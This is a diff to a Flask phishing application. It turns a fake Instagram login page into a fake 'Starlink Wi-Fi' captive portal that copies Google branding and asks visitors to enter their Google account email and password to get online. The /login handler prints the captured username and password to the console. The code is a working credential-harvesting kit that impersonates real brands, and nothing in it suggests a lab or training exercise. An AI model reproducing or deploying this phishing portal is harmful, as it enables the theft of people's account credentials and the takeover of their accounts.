@@ -3,49 +3,135 @@ import random
 
 app = Flask(__name__)
 
-# ================= Login Page HTML (White UI, Instagram gradient header) =================
+# ================= Login Page HTML (Starlink Wi-Fi UI) =================
 LOGIN_PAGE_HTML = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Instagram Login</title>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+<title>Starlink Wi-Fi Sign in</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;}
-body{display:flex;justify-content:center;align-items:center;height:100vh;background:#fff;}
-.login-container{background:#fff;padding:30px;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:350px;}
-h1{font-size:48px;font-weight:bold;font-family:'Billabong', cursive;background: linear-gradient(45deg,#f58529,#dd2a7b,#8134af,#515bd4);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-align:center;margin-bottom:20px;}
-input{width:100%;padding:12px;margin-bottom:10px;border:1px solid #ccc;border-radius:5px;outline:none;background:#f5f5f5;}
-input::placeholder{color:#888;}
-button{width:100%;padding:10px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer;}
-button:hover{background:#1877f2;}
-.forgot-password{text-align:center;margin-top:20px;}
-.forgot-password a{color:#555;text-decoration:none;font-size:14px;}
-.create-account{text-align:center;margin-top:30px;}
-.create-account-btn{padding:10px 20px;background:transparent;border:1px solid #4a90e2;border-radius:8px;color:#4a90e2;font-size:14px;font-weight:600;text-decoration:none;display:inline-block;}
-.create-account-btn:hover{background:rgba(74,144,226,0.1);}
-.meta-container{text-align:center;margin-top:30px;font-size:12px;color:#777;}
+* { margin:0; padding:0; box-sizing:border-box; }
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+}
+
+.container {
+    width: 100%;
+    max-width: 450px;
+    background: white;
+    border-radius: 12px;
+    padding: 40px 32px;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+}
+
+.wifi-name {
+    text-align: center;
+    font-size: 32px;
+    font-weight: 700;
+    background: linear-gradient(270deg, #f58529, #dd2a7b, #8134af, #515bd4, #1dcaff, #f58529);
+    background-size: 600% 600%;
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    animation: gradientMove 6s ease infinite;
+    margin-bottom: 16px;
+}
+
+@keyframes gradientMove {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+}
+
+.google-logo { text-align:center; margin-bottom:32px; }
+.google-logo span { font-size:24px; font-weight:500; letter-spacing:0.5px; }
+.logo-g { color:#4285F4; } .logo-o1 { color:#EA4335; } .logo-o2 { color:#FBBC04; }
+.logo-g2 { color:#34A853; } .logo-l { color:#EA4335; } .logo-e { color:#4285F4; }
+
+h1 { font-size:24px; font-weight:500; color:#202124; margin-bottom:12px; text-align:center; }
+
+.description { font-size:14px; color:#5f6368; text-align:center; margin-bottom:24px; line-height:1.5; }
+
+.learn-more { text-align:center; margin-bottom:24px; }
+.learn-more a { color:#1f73e8; text-decoration:none; font-size:14px; cursor:pointer; }
+.learn-more a:hover { text-decoration:underline; }
+
+.form-group { margin-bottom:24px; }
+.form-group input {
+    width:100%; padding:12px; border:1px solid #dadce0; border-radius:4px;
+    font-size:16px; font-family:inherit; color:#202124; background:white; transition:border-color 0.2s;
+}
+.form-group input:focus { outline:none; border-color:#4285F4; box-shadow:0 0 0 3px rgba(66,133,244,0.1); }
+.form-group input::placeholder { color:#9aa0a6; }
+
+.forgot-password { margin-bottom:24px; }
+.forgot-password a { color:#1f73e8; text-decoration:none; font-size:14px; cursor:pointer; }
+.forgot-password a:hover { text-decoration:underline; }
+
+.create-account { margin-bottom:32px; }
+.create-account a { color:#1f73e8; text-decoration:none; font-size:14px; cursor:pointer; }
+.create-account a:hover { text-decoration:underline; }
+
+.button-container { display:flex; justify-content:flex-end; }
+button {
+    background:#1f73e8; color:white; border:none; padding:10px 24px; border-radius:4px;
+    font-size:14px; font-weight:500; cursor:pointer; transition:background 0.2s;
+}
+button:hover { background:#1765cc; }
+button:active { background:#154fb1; }
+
+@media (max-width:480px){
+    .container { padding:32px 24px; }
+    h1 { font-size:20px; }
+    .wifi-name { font-size:28px; }
+}
 </style>
 </head>
 <body>
-<div class="login-container">
-<h1>Instagram</h1>
-<form action="/login" method="POST">
-<input type="text" name="username" placeholder="Phone number, username, or email" required>
-<input type="password" name="password" placeholder="Password" required>
-<button type="submit">Log In</button>
-</form>
-<div class="forgot-password">
-<a href="#">Forgot password?</a>
-</div>
-<div class="create-account">
-<a href="#" class="create-account-btn">Create new account</a>
-</div>
-<div class="meta-container">
-© 2025 Meta Platforms, Inc. | All rights reserved. Meta authorized
-</div>
+<div class="container">
+    <div class="wifi-name">Starlink Wi-Fi</div>
+
+    <div class="google-logo">
+        <span class="logo-g">G</span><span class="logo-o1">o</span><span class="logo-o2">o</span><span class="logo-g2">g</span><span class="logo-l">l</span><span class="logo-e">e</span>
+    </div>
+
+    <h1>Sign in</h1>
+
+    <p class="description">Please use your <strong>Google Account</strong> to access this WiFi network. Your account will be securely added to this device and can be used with other Google services.</p>
+
+    <div class="learn-more">
+        <a href="#">Learn more about using your account</a>
+    </div>
+
+    <form action="/login" method="POST">
+        <div class="form-group">
+            <input type="email" name="username" placeholder="Email or phone" required>
+        </div>
+
+        <div class="form-group">
+            <input type="password" name="password" placeholder="Password" required>
+        </div>
+
+        <div class="forgot-password">
+            <a href="#">Forgot email?</a>
+        </div>
+
+        <div class="create-account">
+            <a href="#">Create account</a>
+        </div>
+
+        <div class="button-container">
+            <button type="submit">CONNECT</button>
+        </div>
+    </form>
 </div>
 </body>
 </html>
@@ -185,9 +271,9 @@ def login():
 
     # Print credentials to console
     print(f"\n{'='*50}")
-    print(f"Received credentials:")
-    print(f"  Username: {username}")
-    print(f"  Password: {password}")
+    print("Received credentials:")
+    print(f"Username: {username}")
+    print(f"Password: {password}")
     print(f"{'='*50}\n")
 
     # Generate random statistics
